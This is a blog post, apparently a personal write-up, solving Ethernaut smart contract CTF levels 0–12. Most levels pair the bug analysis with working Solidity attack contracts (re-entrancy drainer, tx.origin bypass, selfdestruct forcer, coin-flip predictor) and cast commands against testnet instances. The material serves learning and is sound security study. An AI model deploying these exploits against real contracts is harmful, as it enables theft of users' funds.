@@ -1,0 +1,196 @@
+<!doctype html><html class="dark light" lang=en><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="width=device-width,initial-scale=1.0" name=viewport><meta content=https://4l0n3r.github.io/ name=base><title>
+            
+                Ethernaut Challenge Solutions
+            
+        </title><meta content="Ethernaut Challenge Solutions" property=og:title><meta content="Aka S0m30n3" property=og:description><meta content="Aka S0m30n3" name=description><link href=/favicons/favicon.ico rel=icon type=image/png><link href=https://4l0n3r.github.io/fonts.css rel=stylesheet><script src=https://4l0n3r.github.io/js/codeblock.js></script><script src=https://4l0n3r.github.io/js/toc.js></script><script src=https://4l0n3r.github.io/js/note.js></script><script>MathJax = {
+              tex: {
+                inlineMath: [['$', '$'], ['\\(', '\\)']]
+              }
+            };</script><script async id=MathJax-script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script><link href=https://4l0n3r.github.io/atom.xml rel=alternate title=Johny type=application/atom+xml><link href=https://4l0n3r.github.io/theme/light.css rel=stylesheet><link href=https://4l0n3r.github.io/theme/dark.css id=darkModeStyle rel=stylesheet><script src=https://4l0n3r.github.io/js/themetoggle.js></script><script>setTheme(getSavedTheme());</script><link href=https://4l0n3r.github.io/main.css media=screen rel=stylesheet><body><div class=content><header><div class=main><a href=https://4l0n3r.github.io/>Johny</a><div class=socials><a class=social href=https://x.com/0xJ0hny rel=me> <img alt=twitter src=https://4l0n3r.github.io/icons/social/twitter.svg> </a><a class=social href=https://github.com/4l0n3r/ rel=me> <img alt=github src=https://4l0n3r.github.io/icons/social/github.svg> </a><a class=social href=https://www.linkedin.com/in/johny-vasamsettti/ rel=me> <img alt=linkedin src=https://4l0n3r.github.io/icons/social/linkedin.svg> </a><a href="mailto: vasamsetti.johny@gmail.com" class=social rel=me> <img alt=Email src=https://4l0n3r.github.io/icons/social/email.svg> </a></div></div><nav><a href=https://4l0n3r.github.io/posts style=margin-left:.25em>/posts</a><a href=https://4l0n3r.github.io/writeups style=margin-left:.25em>/writeups</a><a href=https://4l0n3r.github.io/projects style=margin-left:.25em>/projects</a><a href=https://4l0n3r.github.io/tags style=margin-left:.25em>/tags</a><a onclick="toggleTheme(); event.preventDefault();" href=# id=dark-mode-toggle> <img alt=Light id=sun-icon src=https://4l0n3r.github.io/icons/sun.svg style=filter:invert()> <img alt=Dark id=moon-icon src=https://4l0n3r.github.io/icons/moon.svg> </a><script>updateItemToggleTheme()</script></nav></header><main><article><div class=title><div class=page-header>Ethernaut Challenge Solutions<span class=primary-color style=font-size:1.6em>.</span></div><div class=meta>Posted on <time>2024-06-03</time> :: 1551 Words</div></div><div class=toc-container><h1 class=toc-title>Table of Contents</h1><ul class=toc-list><li><a href=https://4l0n3r.github.io/writeups/ethernaut-ctf/#introduction>Introduction</a><li><a href=https://4l0n3r.github.io/writeups/ethernaut-ctf/#0-hello-ethernaut>0: Hello Ethernaut</a><li><a href=https://4l0n3r.github.io/writeups/ethernaut-ctf/#1-fallback>1: Fallback</a><li><a href=https://4l0n3r.github.io/writeups/ethernaut-ctf/#2-fal1out>2: Fal1out</a><li><a href=https://4l0n3r.github.io/writeups/ethernaut-ctf/#3-coin-flip>3: Coin Flip</a><li><a href=https://4l0n3r.github.io/writeups/ethernaut-ctf/#4-telephone>4: Telephone</a><li><a href=https://4l0n3r.github.io/writeups/ethernaut-ctf/#5-token>5: Token</a><li><a href=https://4l0n3r.github.io/writeups/ethernaut-ctf/#6-delegation>6: Delegation</a><li><a href=https://4l0n3r.github.io/writeups/ethernaut-ctf/#7-force>7: Force</a><li><a href=https://4l0n3r.github.io/writeups/ethernaut-ctf/#8-vault>8: Vault</a><li><a href=https://4l0n3r.github.io/writeups/ethernaut-ctf/#9-king>9: King</a><li><a href=https://4l0n3r.github.io/writeups/ethernaut-ctf/#10-re-entrancy>10: Re-entrancy</a><li><a href=https://4l0n3r.github.io/writeups/ethernaut-ctf/#11-elevator>11: Elevator</a><li><a href=https://4l0n3r.github.io/writeups/ethernaut-ctf/#12-privacy>12: Privacy</a></ul></div><section class=body><p>Hello peeps, recently have started learning things about blockchain.Most probably ethernaut would be the first place where people will land to get their hands dirty. I too landed here and I have noted things that I learned through out this CTF challenges.<h1 id=introduction><a aria-label="Anchor link for: introduction" class=zola-anchor href=#introduction>Introduction</a></h1><p>Ethernaut is a foundational platform for hands-on smart contract security practice. Below are my solutions for the first two challenges, highlighting key vulnerabilities and attack vectors.<br> Everytime you got a challenge, start with a click on <code>Get new instance</code>. Once you done with it click on <code>Submit level</code> option.<h1 id=0-hello-ethernaut><a aria-label="Anchor link for: 0-hello-ethernaut" class=zola-anchor href=#0-hello-ethernaut>0: Hello Ethernaut</a></h1><p><strong>Link:</strong> <a href=https://ethernaut.openzeppelin.com/level/0>Hello Ethernaut Challenge</a><br> <strong>Bug:</strong> Sensitive data exposure<br> <strong>Objective:</strong> Familiarize yourself with contract interaction via the browser console<br> <strong>Steps:</strong><ul><li>As they mentioned in the problem statement,let's open the console tab and execute <code>await contract.info()</code>. let move forward with response it gives back</ul><p><img alt=eth-1.png src=../writeup-images/eth-1.png><p><strong>Note:</strong> You might be wondering how can I know that I need to execute the <code>await contract.password()</code> to get the password to authenticate. I strongly believe there might be a variable exist which is being checked in authenticate function. So I checked all the function and variables available in contract with the help of console suggestion whenever we add <code>await contract</code>.<h1 id=1-fallback><a aria-label="Anchor link for: 1-fallback" class=zola-anchor href=#1-fallback>1: Fallback</a></h1><p><strong>Link:</strong> <a href=https://ethernaut.openzeppelin.com/level/1>Fallback Challenge</a><br> <strong>Bug:</strong> Improper ownership transfer in receive() function.<br> <strong>Objective:</strong> Become the owner and drain the contract’s funds.<br> <strong>Description:</strong> The ownership will be given to the user who contributes more through <code>contribute()</code> function. But in the fallback function, I mean in the receive() function it is giving the ownership if you just send more than 0 eth and if you already contributed more than 0 eth using contribute() function.<br> <strong>Steps:</strong><ol><li>make a call to contribute() function to contribute some eth.<li>now make a call to receive() function with some eth<li>call withdraw function to get all the funds from contract.</ol><p><strong>Using Console:</strong><pre class=language-shell data-lang=shell style=color:#61676c;background-color:#fafafa><code class=language-shell data-lang=shell><span>    web3.eth.sendTransaction(
+</span><span>        {
+</span><span>            from: player,
+</span><span>            to: contract.address,
+</span><span>            data: web3.eth.abi.encodeFunctionSignature("contribute()"),
+</span><span>            value: 10**10
+</span><span>        
+</span><span>        }
+</span><span>    )
+</span><span>    
+</span><span>    web3.eth.sendTransaction(
+</span><span>        {
+</span><span>            from: player,
+</span><span>            to: contract.address,
+</span><span>            data: '',
+</span><span>            value: 10**10
+</span><span>        }
+</span><span>    )
+</span></code></pre><p><strong>Using Foundry:</strong> I usually use foundry. In foundry setup, we have a tool called <code>cast</code> to interact with contracts. You can follow the below commands.<pre class=language-shell data-lang=shell style=color:#61676c;background-color:#fafafa><code class=language-shell data-lang=shell><span>    cast send 0x678be0dE93C246b60d05b0dC53E03c226A77bE0E "contribute()" --value 1 --private-key $SEPOLIA_PRIVATE_KEY --rpc-url $SEPOLIA_RPC_U
+</span><span>    cast send 0x678be0dE93C246b60d05b0dC53E03c226A77bE0E  --value 1 --private-key $SEPOLIA_PRIVATE_KEY --rpc-url $SEPOLIA_RPC_URL
+</span><span>    cast send 0x678be0dE93C246b60d05b0dC53E03c226A77bE0E "withdraw()" --private-key $SEPOLIA_PRIVATE_KEY --rpc-url $SEPOLIA_RPC_URL
+</span></code></pre><h1 id=2-fal1out><a aria-label="Anchor link for: 2-fal1out" class=zola-anchor href=#2-fal1out>2: Fal1out</a></h1><p><strong>Link:</strong> <a href=https://ethernaut.openzeppelin.com/level/2>Fal1out Challenge</a><br> <strong>Bug:</strong> Improper ownership transfer in Fal1out() function.<br> <strong>Objective:</strong> Become the owner and drain the contract’s funds.<br> <strong>Description:</strong> The ownership will be given to the user who calls the <code>Fal1out()</code> function. They missed to have the contructor name same as contract name, where it's giving ownership permissions to the creator.<br> <strong>Steps:</strong><ul><li>call the <strong>Fal1out()</strong> function.</ul><p><strong>Using Console:</strong><pre class=language-shell data-lang=shell style=color:#61676c;background-color:#fafafa><code class=language-shell data-lang=shell><span>  await contract.Fal1out()
+</span></code></pre><p><strong>Using Foundry:</strong><pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>cast call 0xb685F5c3aCdb5D874D3e1219D8a4FDF08a502c6E  "Fal1out()" --private-key $SEPOLIA_PRIVATE_KEY --rpc-url $SEPOLIA_RPC_URL
+</span></code></pre><h1 id=3-coin-flip><a aria-label="Anchor link for: 3-coin-flip" class=zola-anchor href=#3-coin-flip>3: Coin Flip</a></h1><p><strong>Link:</strong> <a href=https://ethernaut.openzeppelin.com/level/3>Coin Flip Challenge</a><br> <strong>Bug:</strong> Pseudo-randomness using predictable blockchain data<br> <strong>Objective:</strong> Correctly predict 10 consecutive coin flips<br> <strong>Description:</strong> Coin flip is based the block.number which is known publicly.<br> <strong>Steps:</strong><ul><li>Create an attack contract that performs the same calculation<li>Determine the correct answer before submitting<li>Call the flip function 10 times consecutively</ul><pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.0;
+</span><span>
+</span><span>interface ICoinFlip {
+</span><span>    function flip(bool _guess) external returns (bool);
+</span><span>}
+</span><span>
+</span><span>contract CoinFlipAttacker {
+</span><span>    ICoinFlip public target;
+</span><span>    uint256 public constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+</span><span>
+</span><span>    constructor(address _target) {
+</span><span>        target = ICoinFlip(_target);
+</span><span>    }
+</span><span>
+</span><span>    function attack() external {
+</span><span>        uint256 blockValue = uint256(blockhash(block.number - 1));
+</span><span>        uint256 coinFlip = blockValue / FACTOR;
+</span><span>        bool guess = coinFlip == 1 ? true : false;
+</span><span>        target.flip(guess);
+</span><span>    }
+</span><span>}
+</span></code></pre><p><strong>Consecutive calls using Foundry:</strong><pre class=language-shell data-lang=shell style=color:#61676c;background-color:#fafafa><code class=language-shell data-lang=shell><span>
+</span><span>$ cast call 0xdb0DdE6d17A9d17f57238e6CE66328eC5E28C77A "attack()" --private-key $SEPOLIA_PRIVATE_KEY --rpc-url $SEPOLIA_RPC_URL
+</span></code></pre><h1 id=4-telephone><a aria-label="Anchor link for: 4-telephone" class=zola-anchor href=#4-telephone>4: Telephone</a></h1><p><strong>Link:</strong> <a href=https://ethernaut.openzeppelin.com/level/4>Telephone Challenge</a><br> <strong>Bug:</strong> Incorrect ownership validation using <code>tx.origin</code><br> <strong>Objective:</strong> Claim contract ownership<br> <strong>Description:</strong> The contract checks <code>tx.origin != msg.sender</code>, which can be bypassed through an intermediary contract.<br> <strong>Vulnerability Analysis 🔍:</strong><pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>function changeOwner(address _owner) public {
+</span><span>  if (tx.origin != msg.sender) {  // Vulnerable check
+</span><span>    owner = _owner;
+</span><span>  }
+</span><span>}
+</span></code></pre><p><strong>Steps:</strong><ul><li>Deploy an intermediary contract that calls changeOwner()<li>Trigger the call from your EOA through this contract<li>Bypass the check because: <ul><li>tx.origin = Your wallet address<li>msg.sender = Attack contract address</ul></ul><pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.0;
+</span><span>
+</span><span>interface ITelephone {
+</span><span>    function changeOwner(address _owner) external;
+</span><span>}
+</span><span>
+</span><span>contract TelephoneHack {
+</span><span>    ITelephone public immutable target;
+</span><span>
+</span><span>    constructor(address _target) {
+</span><span>        target = ITelephone(_target);
+</span><span>    }
+</span><span>
+</span><span>    function attack(address _newOwner) external {
+</span><span>        target.changeOwner(_newOwner);
+</span><span>    }
+</span><span>}
+</span></code></pre><p><strong>Execution steps:</strong><pre class=language-shell data-lang=shell style=color:#61676c;background-color:#fafafa><code class=language-shell data-lang=shell><span># 1. Deploy attacker contract
+</span><span>forge create TelephoneHack --constructor-args $TARGET_CONTRACT --private-key $PRIVATE_KEY --rpc-url $RPC_URL
+</span><span>
+</span><span># 2. Execute attack (replace $ATTACKER_CONTRACT with deployed address)
+</span><span>cast send $ATTACKER_CONTRACT "attack(address)" $YOUR_WALLET_ADDRESS \
+</span><span>  --private-key $PRIVATE_KEY --rpc-url $RPC_URL
+</span></code></pre><h1 id=5-token><a aria-label="Anchor link for: 5-token" class=zola-anchor href=#5-token>5: Token</a></h1><p><strong>Link:</strong> <a href=https://ethernaut.openzeppelin.com/level/5>Token Challenge</a><br> <strong>Bug:</strong> Integer underflow vulnerability<br> <strong>Objective:</strong> Increase your token balance beyond initial allocation<br> <strong>Description:</strong> The contract uses outdated Solidity version (0.6.0) without overflow protection.<br> <strong>Vulnerability Analysis:</strong><pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>function transfer(address _to, uint _value) public returns (bool) {
+</span><span>  require(balances[msg.sender] - _value >= 0);  // Vulnerable check
+</span><span>  balances[msg.sender] -= _value;              // Potential underflow
+</span><span>  balances[_to] += _value;
+</span><span>  return true;
+</span><span>}
+</span></code></pre><ul><li>How Integer Limits Work ? <ul><li>Ethereum uses <strong>unsigned integers (uint256)</strong> with range:<br> <code>0</code> to <code>2²⁵⁶ - 1</code><li>When arithmetic exceeds these limits, it <strong>wraps around</strong>: <ul><li><strong>Overflow:</strong> <code>MAX + 1 → 0</code><li><strong>Underflow:</strong> <code>0 - 1 → MAX</code> or <code>X - (X+1)</code> = <code>X - X - 1 = -1 -> MAX</code> assume here X is your current balance. So if you try to transfer at least 1 more than your current balance you will end with having <code>2²⁵⁶ - 1</code> as your balance.</ul></ul></ul><p><strong>Steps to Attack:</strong><ul><li>Find a victim address (can be any non-zero address)<li>Transfer more tokens than you have (causing underflow)<li>Your balance wraps around to maximum uint256 value</ul><p><strong>Using foundry:</strong><pre class=language-shell data-lang=shell style=color:#61676c;background-color:#fafafa><code class=language-shell data-lang=shell><span>$ cast call $CONTRACT_ADDRESS  "balanceOf(address)" $YOUR_ADDRESS  --private-key $SEPOLIA_PRIVATE_KEY --rpc-url $SEPOLIA_RPC_URL // to check your current balance
+</span><span>$ cast send $CONTRACT_ADDRESS  "transfer(address, uint256)" $ANY_ADDRESS  21 --private-key $SEPOLIA_PRIVATE_KEY --rpc-url $SEPOLIA_RPC_URL
+</span></code></pre><h1 id=6-delegation><a aria-label="Anchor link for: 6-delegation" class=zola-anchor href=#6-delegation>6: Delegation</a></h1><p><strong>Link:</strong> <a href=https://ethernaut.openzeppelin.com/level/6>Delegation Challenge</a><br> <strong>Bug:</strong> Unprotected <code>delegatecall</code> allowing storage hijacking<br> <strong>Objective:</strong> Claim ownership of the <code>Delegation</code> contract <strong>Vulnerability Analysis:</strong><pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>contract Delegate {
+</span><span>    address public owner;  // Storage slot 0
+</span><span>    function pwn() public { owner = msg.sender; }
+</span><span>}
+</span><span>
+</span><span>contract Delegation {
+</span><span>    address public owner;  // Storage slot 0 (matches Delegate)
+</span><span>    Delegate delegate;
+</span><span>    function() external { delegate.delegatecall(msg.data); }  // Fallback
+</span><span>}
+</span></code></pre><ul><li>How delegate call works ? <ul><li>delegatecall executes code from another contract in the context of the caller, preserving the original storage, msg.sender, and ETH balance.<li>In our case the <code>delegatecall</code> in <code>Delegation::fallback()</code> uses the <code>Delegation</code> storage and <code>msg.sender</code> and <code>msg.value</code> and execute the function logic which is present <code>Delegate</code> contract.</ul><li>Because Solidity stores state variables in declaration order, when we call pwn() on the Delegate contract via delegatecall from the Delegation contract, it modifies the storage slot of the Delegation contract (Slot 0 - owner) rather than the Delegate contract's storage. This storage collision allows us to overwrite Delegation's owner variable.</ul><p><strong>Steps to Attack:</strong><ul><li>Craft malicious calldata to trigger Delegate.pwn()<li>Force the fallback to execute via delegatecall<li>Storage collision modifies Delegation.owner</ul><p><strong>Using Foundry:</strong><pre class=language-shell data-lang=shell style=color:#61676c;background-color:#fafafa><code class=language-shell data-lang=shell><span># 1. Calculate selector (alternatively use cast sig "pwn()")
+</span><span>$ cast keccak "pwn()" | cut -c1-10  # Returns 0xdd365b8b, this is our calldata
+</span><span>
+</span><span># 2. Send malicious transaction
+</span><span>$ cast send $DELEGATION_ADDRESS 0xdd365b8b --private-key $PRIVATE_KEY --rpc-url $RPC_URL // this will call our fallback function with msg.data as 0xdd365b8b. 
+</span></code></pre><h1 id=7-force><a aria-label="Anchor link for: 7-force" class=zola-anchor href=#7-force>7: Force</a></h1><p><strong>Link:</strong> <a href=https://ethernaut.openzeppelin.com/level/7>Force Challenge</a><br> <strong>Bug:</strong> Contract lacks payable functions but can still receive ETH<br> <strong>Objective:</strong> Send ETH to the contract by any means<p><strong>Vulnerability Analysis:</strong><br> Smart contracts can receive ETH through:<ol><li>payable functions<li>receive()/fallback()<li>Forced transfers (selfdestruct beneficiary)</ol><p>Since we don't have any functions, let's go with 3rd option to use Forced transders.<p><strong>How selfdestruct works ?</strong> It means to destroy the current contract. If that's the case what will happen to the funds that it contains ? that's why it's expecting an address where all the current contract funds will be moved to the target address. It's an irreversible operation.<p><strong>Steps to Attack:</strong><ul><li>Create a sacrificial contract with ETH balance<li>Call selfdestruct(target) to force ETH transfer</ul><p><strong>Attack Contract:</strong><pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.0;
+</span><span>
+</span><span>contract Attack {
+</span><span>
+</span><span>    constructor() payable {}
+</span><span>
+</span><span>    function attack(address _contract) public {
+</span><span>        selfdestruct(payable(_contract));
+</span><span>    }
+</span><span>}
+</span></code></pre><p>Deploy this contract using remix with some wei by adding <code>1</code> in the <code>VALUE</code> field on <code>Deploy & run transactions</code> block. Then call the <code>attack()</code> function by passing <code>Force</code> contract address as argument.<h1 id=8-vault><a aria-label="Anchor link for: 8-vault" class=zola-anchor href=#8-vault>8: Vault</a></h1><p><strong>Level Link:</strong> <a href=https://ethernaut.openzeppelin.com/level/8>Vault Challenge</a> <strong>Bug:</strong> Private variable visibility misconception.<br> <strong>Objective:</strong> Read the "private" password on storage to unlock the vault.<br> <strong>Vulnerability Analysis:</strong><br> Solidity stores state variables in declaration order on chain.A point to note here is <code>Nothing is private in on-chain</code>. So we can simply read the slot-1 data on-chain using foundry tool.<pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>contract Vault {
+</span><span>    bool public locked;       // Slot 0
+</span><span>    bytes32 private password; // Slot 1 (NOT actually private)
+</span><span>}
+</span></code></pre><p><strong>Steps to Attack:</strong><ul><li>Read password from on-chain. nothing but from slot-1 data.<li>Call <code>unlock()</code> function with the <code>password</code> as argument.</ul><p><strong>Using foundry:</strong><pre class=language-shell data-lang=shell style=color:#61676c;background-color:#fafafa><code class=language-shell data-lang=shell><span> cast storage $CONTRACT_ADDRESS 1 --rpc-url $SEPOLIA_RPC_URL
+</span><span> cast send $CONTRACT_ADDRESS "unlock(bytes32)" $PASSWORD --private-key $SEPOLIA_PRIVATE_KEY --rpc-url $SEPOLIA_RPC_URL
+</span></code></pre><h1 id=9-king><a aria-label="Anchor link for: 9-king" class=zola-anchor href=#9-king>9: King</a></h1><p><strong>Level Link:</strong> <a href=https://ethernaut.openzeppelin.com/level/9>King Challenge</a> <strong>Bug:</strong> Unhandled transfer failure in receive()<br> <strong>Objective:</strong> Become king and prevent future takeovers <strong>Vulnerability Analysis:</strong><pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>receive() external payable {
+</span><span>    require(msg.value >= prize || msg.sender == owner);
+</span><span>    payable(king).transfer(msg.value); // ❌ Fails if king is contract without fallback
+</span><span>    king = msg.sender; // Only executes if transfer succeeds
+</span><span>    prize = msg.value;
+</span><span>}
+</span></code></pre><p>The objective of contract is whoever bids more than earlier will get the <code>king</code> position and the old king will get the money that the new <code>king</code> bids. Our goal is, the caller contract to take over the <code>king</code> position and block anyone else to take it over back. This could be possible if we don't have fallback functions in caller contract. Without transferring funds to the current king, no one can take over the <code>king</code> position.<p><strong>Steps to Attack:</strong><ul><li>Get the current <code>prize</code> value by using foundry call.<li>Deploy a contract which sends eth to <code>King</code> contract to take ownership.<li>contract shouldn't have receive() / fallback() functions.</ul><p><strong>Attack Contract:</strong><pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.0;
+</span><span>
+</span><span>contract Attack {
+</span><span>    function attack(address payable  _contract) public payable {
+</span><span>        // cast call $CONTRACT_ADDRESS "prize()" --private-key $SEPOLIA_PRIVATE_KEY --rpc-url $SEPOLIA_RPC_URL
+</span><span>        _contract.call{value:2000000000000000}('');
+</span><span>    }
+</span><span>}
+</span></code></pre><h1 id=10-re-entrancy><a aria-label="Anchor link for: 10-re-entrancy" class=zola-anchor href=#10-re-entrancy>10: Re-entrancy</a></h1><p><strong>Level Link:</strong> <a href=https://ethernaut.openzeppelin.com/level/10>Re-entrancy Challenge</a><br> <strong>Bug:</strong> Classic re-entrancy attack<br> <strong>Objective:</strong> Drain all contract ETH<br> <strong>Vulnerability Analysis:</strong><pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>function withdraw(uint _amount) public {
+</span><span>    if(balances[msg.sender] >= _amount) {
+</span><span>        (bool sent,) = msg.sender.call{value: _amount}("");
+</span><span>        require(sent, "Transfer failed");
+</span><span>        balances[msg.sender] -= _amount; // ❌ State update AFTER transfer
+</span><span>    }
+</span><span>}
+</span></code></pre><p>The vulnerable contract reduces balances after sending ETH via call.value(), which triggers the receiver's receive() function. Crucially, this external call hands control to the attacker's contract before state updates occur. If the attacker's receive() function calls withdraw() again:<ul><li>The original withdraw() hasn't yet updated balances[msg.sender]<li>The re-entrant call passes the same balance check again<li>Another ETH transfer is initiated, creating a recursive loop</ul><p><strong>Attack Contract:</strong><pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.0;
+</span><span>
+</span><span>contract ReentrancyAttacker {
+</span><span>    uint256 public initialDeposit;
+</span><span>    event Response(uint256 xxx);
+</span><span>    event Response2(address target);
+</span><span>
+</span><span>    function attack(address payable target) external payable {
+</span><span>        initialDeposit = msg.value;
+</span><span>        target.call{value:initialDeposit}(abi.encodeWithSignature("donate(address)", address(this)));
+</span><span>
+</span><span>        target.call(abi.encodeWithSignature("withdraw(uint256)", initialDeposit));
+</span><span>    }
+</span><span>
+</span><span>    receive() external payable {
+</span><span>        uint256 balance = initialDeposit;
+</span><span>        if (msg.sender.balance &lt; initialDeposit) {
+</span><span>            balance = msg.sender.balance;
+</span><span>        }
+</span><span>        if (balance > 0)
+</span><span>            msg.sender.call(abi.encodeWithSignature("withdraw(uint256)", balance));
+</span><span>    }
+</span><span>}
+</span></code></pre><p><strong>Steps to attack:</strong><ul><li>Deploy the contract using remix<li>call the <code>attack()</code> function.</ul><hr><h1 id=11-elevator><a aria-label="Anchor link for: 11-elevator" class=zola-anchor href=#11-elevator>11: Elevator</a></h1><p><strong>Level Link:</strong> <a href=https://ethernaut.openzeppelin.com/level/11>Elevator Challenge</a><br> <strong>Vulnerability:</strong> Interface implementation deception<br> <strong>Objective:</strong> Manipulate the elevator to reach the top floor<br> <strong>Vulnerability Analysis:</strong><br> The Elevator contract calls isLastFloor() twice in the same transaction. We exploit this by making it return false on the first call (to enter the if block) and true on the second call (to satisfy the final check). This works because:<ul><li>First Call: Returns false → if (!false) succeeds → updates currentFloor<li>Second Call: Returns true → lets the state change persist</ul><p>The attack succeeds because the contract doesn't verify if isLastFloor() gives consistent responses within a single transaction.<br> <strong>Attack Contract:</strong><pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.0;
+</span><span>
+</span><span>contract FakeBuilding {
+</span><span>    bool private toggle;
+</span><span>
+</span><span>    function isLastFloor(uint) external returns (bool) {
+</span><span>        toggle = !toggle;
+</span><span>        return toggle; // First call: false, Second call: true
+</span><span>    }
+</span><span>
+</span><span>    function attack(address target, uint floor) public {
+</span><span>        target.call(abi.encodeWithSignature("goTo(uint256)",floor));
+</span><span>    }
+</span><span>}
+</span></code></pre><hr><h1 id=12-privacy><a aria-label="Anchor link for: 12-privacy" class=zola-anchor href=#12-privacy>12: Privacy</a></h1><p><strong>Level Link:</strong> <a href=https://ethernaut.openzeppelin.com/level/12>Privacy Challenge</a><br> <strong>Bug:</strong> Private variable storage access using slots<br> <strong>Objective:</strong> Unlock the contract by reading private storage<p><strong>Vulnerability Analysis:</strong><br> The contract stores sensitive data in private variables, but all contract storage is publicly readable. We exploit this by reading the data[2]. But how can I read ? Solidity stores the data in the order they declared. Starting from the first, it collects the variables which are combinedly under 32 bytes and store it in storage[0] then again starts reading variables and collects which are under 32 bytes and have it in storage[1] goes like this. In our case<pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>bool public locked = true;  // bool needs 1byte -> Goes to storage[0]
+</span><span>uint256 public ID = block.timestamp; // uint256 needs 32Bytes -> Even though we have 31bytes left on first slot it can't accomodate 32bytes so it will goes to slot[1]
+</span><span>uint8 private flattening = 10; // uint8 needs 1Byte -> goes to slot[2]
+</span><span>uint8 private denomination = 255; // uint8 needs 1Byte -> goes to slot[2]
+</span><span>uint16 private awkwardness = uint16(block.timestamp); // uint16 needs 2Bytes -> goes to slot[2]
+</span><span>bytes32[3] private data; // bytes32[3] needs 32Bytes for each one. data[0] -> slot[3] , data[1] -> slot[4], data[2] -> slot[5] 
+</span></code></pre><p><strong>Attack Steps:</strong><ol><li>Reading <code>data[2]</code> from Slot 5 (storage is sequential)<pre class=language-bash data-lang=bash style=color:#61676c;background-color:#fafafa><code class=language-bash data-lang=bash><span>DATA</span><span style=color:#ed9366>=</span><span style=color:#86b300>$</span><span>(</span><span style=color:#f29718>cast</span><span style=color:#86b300> storage $</span><span>CONTRACT_ADDR</span><span style=color:#86b300> 5</span><span style=color:#ff8f40> --rpc-url </span><span style=color:#86b300>$</span><span>RPC_URL)
+</span></code></pre><li>Take first 16 bytes (e.g., 0x1234... → 0x1234)<pre style=color:#61676c;background-color:#fafafa><code><span># Extract first 16 bytes (remove '0x' + first 32 chars)
+</span><span>BYTES16_KEY="0x${DATA:2:32}"
+</span></code></pre><li>Call unlock(bytes16(key))<pre class=language-bash data-lang=bash style=color:#61676c;background-color:#fafafa><code class=language-bash data-lang=bash><span style=color:#f29718>cast</span><span> send $CONTRACT_ADDR </span><span style=color:#86b300>"unlock(bytes16)" </span><span>$BYTES16_KEY</span><span style=color:#ff8f40> --private-key </span><span>$PK</span><span style=color:#ff8f40> --rpc-url </span><span>$RPC_URL
+</span></code></pre></ol></section></article></main></div>
